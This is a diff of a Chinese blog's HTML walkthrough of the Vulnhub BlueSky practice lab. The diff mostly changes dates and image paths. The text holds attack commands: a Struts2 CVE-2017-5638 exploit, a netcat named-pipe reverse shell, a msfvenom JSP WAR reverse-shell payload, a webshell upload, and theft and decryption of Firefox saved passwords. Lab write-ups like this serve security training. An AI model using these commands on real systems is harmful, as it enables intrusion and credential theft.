@@ -207,7 +207,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">十月 17, 2021&nbsp;&nbsp;0:00:00</a>
+                        Date: <a href="#">十月 7, 2021&nbsp;&nbsp;16:31:38</a>
                         </span>
                     
                     
@@ -218,59 +218,59 @@
         <div class="post-content">
             <h1 id="靶场实战-Vulnhub-BlueSky"><a href="#靶场实战-Vulnhub-BlueSky" class="headerlink" title="靶场实战 Vulnhub-BlueSky"></a>靶场实战 Vulnhub-BlueSky</h1><p>首先使用kali扫描靶场的IP地址</p>
 <p>Arp-scan –l</p>
-<img src="/2021/10/17/1/image1.png" class="" title="image1">
+<img src="/2021/10/07/1/image1.png" class="" title="image1">
 
 <p>对比MAC地址 成功得到靶场IP地址192.168.72.131</p>
 <p>进行端口扫描</p>
 <p>Nmap –Sv –v 192.168.72.131</p>
-<img src="/2021/10/17/1/image2.png" class="" title="image2">
+<img src="/2021/10/07/1/image2.png" class="" title="image2">
 
 <p>开放了端口22和8080</p>
 <p>22为SSH端口，突破多半都是弱口令，咱们先不考虑这种情况，访问8080的WEB服务器看看</p>
 <p><a target="_blank" rel="noopener" href="http://192.168.72.131:8080/">http://192.168.72.131:8080</a></p>
-<img src="/2021/10/17/1/image3.png" class="" title="image3">
+<img src="/2021/10/07/1/image3.png" class="" title="image3">
 
 <p>访问后发现是tomcat 9.0.40 第一时间想到了tomcat的cve漏洞</p>
 <p>使用searchsploit搜索 tomcat 9.0.40的漏洞</p>
-<img src="/2021/10/17/1/image4.png" class="" title="image4">
+<img src="/2021/10/07/1/image4.png" class="" title="image4">
 
 <p>嗯…好像没有</p>
 <p>那就测试一波0day吧(弱口令)</p>
 <p>Tomcat&#x2F;tomcat</p>
 <p>Admin&#x2F;admin</p>
-<img src="/2021/10/17/1/image5.png" class="" title="image5">
+<img src="/2021/10/07/1/image5.png" class="" title="image5">
 
 <p>OK 确认没有0day</p>
 <p>那就只能找该版本存在的漏洞了</p>
 <p>在百度找到一个struts2-showcase的漏洞（s2-048远程代码执行）</p>
 <p>好家伙 直接上工具了哈 就懒得再测试了</p>
 <p>url: <a target="_blank" rel="noopener" href="http://192.168.72.131:8080/struts2-showcase/index.action">http://192.168.72.131:8080/struts2-showcase/index.action</a></p>
-<img src="/2021/10/17/1/image6.png" class="" title="image6">
+<img src="/2021/10/07/1/image6.png" class="" title="image6">
 
 <p>好家伙 这个URL我爆目录还没爆出来 在网上搜索相关漏洞才找到</p>
 <p>下载exp</p>
 <p>git clone <a target="_blank" rel="noopener" href="https://github.com/jrrdev/cve-2017-5638.git">https://github.com/jrrdev/cve-2017-5638.git</a></p>
 <p>测试是否存在漏洞</p>
 <p>python exploit.py “<a target="_blank" rel="noopener" href="http://192.168.72.131:8080/struts2-showcase/index.action&quot;">http://192.168.72.131:8080/struts2-showcase/index.action&quot;</a> “whoami”</p>
-<img src="/2021/10/17/1/image7.png" class="" title="image7">
+<img src="/2021/10/07/1/image7.png" class="" title="image7">
 
 <p>whoami执行成功</p>
 <p>查看是否存在nc权限</p>
 <p>python exploit.py “<a target="_blank" rel="noopener" href="http://192.168.72.131:8080/struts2-showcase/index.action&quot;">http://192.168.72.131:8080/struts2-showcase/index.action&quot;</a> “nc”</p>
-<img src="/2021/10/17/1/image8.png" class="" title="image8">
+<img src="/2021/10/07/1/image8.png" class="" title="image8">
 
 <p>存在nc权限的 但似乎没有nc –e的权限 得通过其他方式反弹shell了</p>
 <p>首先使用mknod建立管道</p>
 <p>Python exploit.py “<a target="_blank" rel="noopener" href="http://192.168.72.131:8080/struts2-showcase/index.action&quot;">http://192.168.72.131:8080/struts2-showcase/index.action&quot;</a> “mknod &#x2F;tmp&#x2F;backpipe p”</p>
-<img src="/2021/10/17/1/image9.png" class="" title="image9">
+<img src="/2021/10/07/1/image9.png" class="" title="image9">
 
 <p>Kali监听4444端口</p>
 <p>Nc –nvlp 4444</p>
-<img src="/2021/10/17/1/image10.png" class="" title="image10">
+<img src="/2021/10/07/1/image10.png" class="" title="image10">
 
 <p>反弹shell，将内容传递物使用管道文件p作为桥梁，进行数据重定向传递</p>
 <p>python exploit.py “<a target="_blank" rel="noopener" href="http://192.168.72.131:8080/struts2-showcase/index.action&quot;">http://192.168.72.131:8080/struts2-showcase/index.action&quot;</a> -c “&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;p | nc 192.168.72.133 4444 1&gt;&#x2F;tmp&#x2F;p”</p>
-<img src="/2021/10/17/1/image11.png" class="" title="image11">
+<img src="/2021/10/07/1/image11.png" class="" title="image11">
 
 <p>正常来说现在kali是会获取到一个nc的shell的，但我这边不知道什么原因无法成功，先教大家此方法继续操作的方法，我再演示我自己做的替代的方法</p>
 <p>获取到shell后在shell内运行</p>
@@ -279,7 +279,7 @@
 <p>第二种方法：</p>
 <p>第二种方法我们使用window来进行渗透</p>
 <p>首先使用struts2的图形化验证工具进行漏洞验证</p>
-<img src="/2021/10/17/1/image12.png" class="" title="image12">
+<img src="/2021/10/07/1/image12.png" class="" title="image12">
 
 <p>得到目录地址</p>
 <p>webpath:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;struts2-showcase&#x2F;</p>
@@ -288,7 +288,7 @@
 <p>直接上传蚁剑的马也会超出字节限制</p>
 <p>那么怎么办呢？</p>
 <p>很好解决，首先我们上传一个下载文件的一句话木马</p>
-<img src="/2021/10/17/1/image13.png" class="" title="image13">
+<img src="/2021/10/07/1/image13.png" class="" title="image13">
 
 <p>得到webshell地址</p>
 <p><a target="_blank" rel="noopener" href="http://192.168.72.131:8080/struts2-showcase/111.jsp">http://192.168.72.131:8080/struts2-showcase/111.jsp</a></p>
@@ -297,10 +297,10 @@
 <p>上面的222.jsp是要保存的webshell马名字</p>
 <p>333.jsp是我们在本地web服务器内储存的名字</p>
 <p>111.jsp是当前的下载马</p>
-<img src="/2021/10/17/1/image14.png" class="" title="image14">
+<img src="/2021/10/07/1/image14.png" class="" title="image14">
 
 <p>成功下载蚁剑的一句话木马</p>
-<img src="/2021/10/17/1/image15.png" class="" title="image15">
+<img src="/2021/10/07/1/image15.png" class="" title="image15">
 
 <p>可以成功访问文件，但我们发现该一句话木马似乎无法执行命令，那怎么办呢？</p>
 <p>小问题，我们利用tomcat本身的漏洞进行提权就好了</p>
@@ -312,46 +312,46 @@
 <p>成功得到</p>
 <p>账号：admin</p>
 <p>密码：6mzf3&gt;gfZ.pN8_Mp</p>
-<img src="/2021/10/17/1/image16.png" class="" title="image16">
+<img src="/2021/10/07/1/image16.png" class="" title="image16">
 
 <p>注意：此方法较为麻烦，主要用于无法使用nc弹回shell的情况下使用，我这边使用了各个方法都无法弹回，不得已之下才使用这个方法</p>
 <p>现在我们回到网页去登录账号密码</p>
-<img src="/2021/10/17/1/image17.png" class="" title="image17">
+<img src="/2021/10/07/1/image17.png" class="" title="image17">
 
 <p>登陆后的状态</p>
-<img src="/2021/10/17/1/image18.png" class="" title="image18">
+<img src="/2021/10/07/1/image18.png" class="" title="image18">
 
 <p>我们发现下面可以部署文件，OK 那就好办了</p>
 <p>使用WAR木马上传反弹shell就搞定了</p>
 <p>使用msfvenom生成war马</p>
 <p>msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.72.133 LPORT&#x3D;5555 -f war -o shell.war</p>
-<img src="/2021/10/17/1/image19.png" class="" title="image19">
+<img src="/2021/10/07/1/image19.png" class="" title="image19">
 
 <p>OK 我们去上传</p>
-<img src="/2021/10/17/1/image20.png" class="" title="image20">
+<img src="/2021/10/07/1/image20.png" class="" title="image20">
 
 <p>成功上传后，我们可以看到&#x2F;shell 这就是我们上传的war马</p>
 <p>在kali中监听5555端口</p>
 <p>Nc –nvlp 5555</p>
-<img src="/2021/10/17/1/image21.png" class="" title="image21">
+<img src="/2021/10/07/1/image21.png" class="" title="image21">
 
 <p>然后去访问我们上传的war马</p>
 <p>curl <a target="_blank" rel="noopener" href="http://192.168.72.131:8080/shell/">http://192.168.72.131:8080/shell/</a></p>
-<img src="/2021/10/17/1/image22.png" class="" title="image22">
+<img src="/2021/10/07/1/image22.png" class="" title="image22">
 
 <p>OK 我们成功获取到一个shell</p>
-<img src="/2021/10/17/1/image23.png" class="" title="image23">
+<img src="/2021/10/07/1/image23.png" class="" title="image23">
 
 <p>同样的我们使用python3获取一个交互式shell</p>
 <p>python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
-<img src="/2021/10/17/1/image24.png" class="" title="image24">
+<img src="/2021/10/07/1/image24.png" class="" title="image24">
 
 <p>查看user.txt文件 成功获取user账户的flag</p>
-<img src="/2021/10/17/1/image25.png" class="" title="image25">
+<img src="/2021/10/07/1/image25.png" class="" title="image25">
 
 <p>我们查看所有文件</p>
 <p>Ls –a</p>
-<img src="/2021/10/17/1/image26.png" class="" title="image26">
+<img src="/2021/10/07/1/image26.png" class="" title="image26">
 
 <p>在用户根目录下发现mozilla firefox浏览器文件</p>
 <p>对我来说，最想要得到的就是它的用户名密码记录</p>
@@ -367,26 +367,26 @@
 <p>使用wget成功拷贝两个文件</p>
 <p>wget <a target="_blank" rel="noopener" href="http://192.168.72.131:6666/logins.json">http://192.168.72.131:6666/logins.json</a></p>
 <p>wget <a target="_blank" rel="noopener" href="http://192.168.72.131:6666/key4.db">http://192.168.72.131:6666/key4.db</a></p>
-<img src="/2021/10/17/1/image27.png" class="" title="image27">
+<img src="/2021/10/07/1/image27.png" class="" title="image27">
 
 <p>下载解密脚本</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/lclevy/firepwd">https://github.com/lclevy/firepwd</a></p>
 <p>git clone <a target="_blank" rel="noopener" href="https://github.com/lclevy/firepwd.git">https://github.com/lclevy/firepwd.git</a></p>
 <p>cd firepwd</p>
 <p>pip3 install -r requirements.txt</p>
-<img src="/2021/10/17/1/image28.png" class="" title="image28">
+<img src="/2021/10/07/1/image28.png" class="" title="image28">
 
 <p>运行python3 firepwd.py</p>
 <p><a href="https://twitter.com:b'minhtuan',b'skysayohyeah">https://twitter.com:b'minhtuan',b'skysayohyeah</a>‘</p>
 <p>得到账号：minhtuan</p>
 <p>得到密码：skysayohyeah</p>
 <p>我们使用sudo –l查看sudo权限</p>
-<img src="/2021/10/17/1/image29.png" class="" title="image29">
+<img src="/2021/10/07/1/image29.png" class="" title="image29">
 
 <p>权限挺高 直接sudo su即可成功提权</p>
-<img src="/2021/10/17/1/image30.png" class="" title="image30">
+<img src="/2021/10/07/1/image30.png" class="" title="image30">
 
-<img src="/2021/10/17/1/image31.png" class="" title="image31">
+<img src="/2021/10/07/1/image31.png" class="" title="image31">
 
 <p>成功拿到root权限的flag</p>
 <p>本次靶场完成</p>
@@ -404,7 +404,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://www.lucifiel.com/2021/10/17/1/">http://www.lucifiel.com/2021/10/17/1/</a></span>
+                        <span><a href="http://www.lucifiel.com/2021/10/07/1/">http://www.lucifiel.com/2021/10/07/1/</a></span>
                     </p>
                 
                 
@@ -431,8 +431,8 @@
         </section>
         <section class="post-nav">
             
+                <a class="prev" rel="prev" href="/2021/10/17/2/">Vulnhub - Chill_Hack 靶场实战</a>
             
-            <a class="next" rel="next" href="/2021/10/07/2/">Vulnhub - Chill_Hack 靶场实战</a>
             
         </section>
 
